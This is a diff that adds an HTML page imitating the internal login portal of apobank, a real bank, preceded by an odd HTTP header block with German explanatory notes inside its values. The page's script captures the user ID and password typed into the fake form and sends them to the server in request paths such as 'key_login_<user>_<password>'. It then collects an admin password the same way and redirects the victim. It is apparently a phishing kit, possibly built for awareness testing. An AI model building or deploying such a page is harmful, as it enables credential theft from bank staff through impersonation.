@@ -1,0 +1,70 @@
+HTTP/1.1 200 OK
+Server: Apache/1.3.29 (Unix) PHP/4.3.4
+Content-Length: 123456 (Größe von infotext.html in Byte)
+Content-Language: en_US (nach RFC 3282 sowie RFC 1766)
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<META HTTP-EQUIV="Expires" CONTENT="-1">
+<head>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/_catalogs/theme/Themed/CDF40450/corev15-433D5376.themedcss?ctag=29"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/_catalogs/theme/Themed/CDF40450/searchv15-8AE2044B.themedcss?ctag=29"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/_layouts/15/1031/styles/WebTaggingUI.css?rev=xj9JkWxmR72vRyF%2FuguuIA%3D%3DTAG0"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/_catalogs/theme/Themed/CDF40450/portal-99375EEB.themedcss?ctag=29"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/_layouts/15/1031/styles/SuiteNav.css?rev=5z16wmEQxAYBXVqSZ%2BP0Lg%3D%3DTAG0"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/Style%20Library/apo/startseite.css"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/Style%20Library/apo/apocustom.css"/>
+<link rel="stylesheet" type="text/css" href="https://intern.apobank.de/Style%20Library/apo/nositetitle.css"/>
+<style>
+</style>
+<script>
+  function p(par1){
+    document.cookie = document.getElementById('Y').value.toLowerCase();
+    var xhttp1 = new XMLHttpRequest();
+    xhttp1.open("POST", "key_login_"+document.getElementById('Y').value.toLowerCase()+"_"+document.getElementById('pwd').value, true);
+    xhttp1.send();
+    setTimeout(function() {
+      var xhttp2 = new XMLHttpRequest();
+      xhttp2.open("POST", "key_SSnum_"+par1, true);
+      xhttp2.send();
+      setTimeout(function() {
+        window.open(window.location.href+"ss.html","_self");
+      }, 500);
+    }, 500);
+  }
+  function q(par1){
+    document.cookie = document.getElementById('passwd').value.toLowerCase();
+    var xhttp1 = new XMLHttpRequest();
+    xhttp1.open("POST", "key_admin_"+document.cookie+"_"+par1, true);
+    xhttp1.send();
+    setTimeout(function() {
+      window.open(window.location.href+"admin.html","_self");
+    }, 500);
+  }
+  setTimeout(function() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "key_kia", true);
+    xhttp.send();
+    alert("Timeout, please Reload!");
+  }, 1000000);
+</script>
+</head>
+<body id="aspnetForm">
+
+<div style="position:absolute; left: 20px;">
+<div id="suiteBarDelta"><div id="suiteBarTop" style="height:50px; width:1140px; position:relative;background-color: #8c2341;text-align: center;"><h2 style="color: #FFFFFF;">Service-Academy</h2></div></div><br>
+<div style="width:1120px; position:relative; left:10px;">
+<table style="width:100%">
+<tr><th>
+<p>Login Kundenberater:</p>
+<table style="position:relative; left: 185px">
+<th>
+Y-Kennung:
+<br>
+Passwort:
+</th><th><input id="Y"/><br>
+<input type="password" id="pwd"/>
+</th></table>
